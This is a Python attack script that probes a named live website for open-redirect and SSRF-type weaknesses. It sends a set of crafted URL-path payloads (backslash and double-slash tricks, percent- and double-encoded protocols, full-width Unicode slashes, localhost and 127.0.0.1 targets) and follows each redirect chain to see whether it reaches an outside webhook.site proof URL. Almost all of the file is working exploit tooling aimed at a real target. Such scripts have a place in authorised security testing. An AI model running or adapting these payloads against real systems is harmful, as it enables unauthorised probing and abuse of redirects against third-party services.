import requests
import urllib.parse
import json
from datetime import datetime

TIMEOUT = 12

def fetch_chain(url):
    chain = []
    try:
        r = requests.get(url, allow_redirects=False, timeout=TIMEOUT)
        chain.append({
            "url": url,
            "status": r.status_code,
            "location": r.headers.get("Location"),
            "snippet": r.text[:200] if r.text else None
        })

        # follow redirects manually to capture exact chain
        while 300 <= r.status_code < 400 and r.headers.get("Location"):
            next_url = urllib.parse.urljoin(url, r.headers["Location"])
            r = requests.get(next_url, allow_redirects=False, timeout=TIMEOUT)

            chain.append({
                "url": next_url,
                "status": r.status_code,
                "location": r.headers.get("Location"),
                "snippet": r.text[:200] if r.text else None
            })

            url = next_url

        return chain, r.status_code

    except Exception as e:
        return [{"url": url, "error": str(e)}], None


def test_payloads(target, prove_url, tag):
    payloads = {
        "backslash_double_localhost": r"/\\localhost:3000",
        "backslash_127": r"/\http://127.0.0.1:3000",
        "double_slash_localhost": r"//http://localhost:3000",
        "double_slash_127": r"//127.0.0.1:3000",
        "proto_backslash_prove": r"/\https://{}".format(prove_url.replace("https://", "")),
        "proto_backslash_double_prove": r"/\\https://{}".format(prove_url.replace("https://", "")),
        "proto_double_slash_prove": r"//https://{}".format(prove_url.replace("https://", "")),
        "proto_pct_encoded": r"/\http%3A%2F%2F{}".format(prove_url.replace("https://", "")),
        "proto_double_pct": r"/\\http%3A%2F%2F{}".format(prove_url.replace("https://", "")),
        "double_encoded_prove": r"/%255Chttps://{}".format(prove_url.replace("https://", "")),
        "pct_backslash": r"/%5C",
        "pct_pct_backslash": r"/%255C",
        "pct_encoded_protocol_h": r"/h%74tp://example.com",
        "pct_encoded_https_prove": r"/h%74tps://{}".format(prove_url.replace("https://", "")),
        "unicode_fullwidth_slash": r"/%EF%BC%8Fhttps://{}".format(prove_url.replace("https://", "")),
    }

    results = {}

    for name, path in payloads.items():
        full_url = f"{target}{path}?ultra={tag}"
        chain, final_status = fetch_chain(full_url)

        indicators = []
        if "localhost" in path: indicators.append("localhost")
        if "127.0.0.1" in path: indicators.append("127.0.0.1")
        if prove_url.replace("https://", "") in path: indicators.append("PROVE_URL")

        results[name] = {
            "path": path,
            "res": {
                "initial": {
                    "path": path,
                    "final_status": final_status
                },
                "chain": chain
            },
            "indicators": indicators
        }

    return results


if __name__ == "__main__":
    TARGET = "https://demo.djangocfg.com"
    PROVE = "https://en8q-xxxxxx.webhook.site/unique-id"
    TAG = "frti8y5u"

    out = {
        "target": TARGET,
        "tag": TAG,
        "prove": PROVE,
        "timestamp": datetime.utcnow().isoformat(),
        "results": test_payloads(TARGET, PROVE, TAG)
    }

    print(json.dumps(out, indent=2))
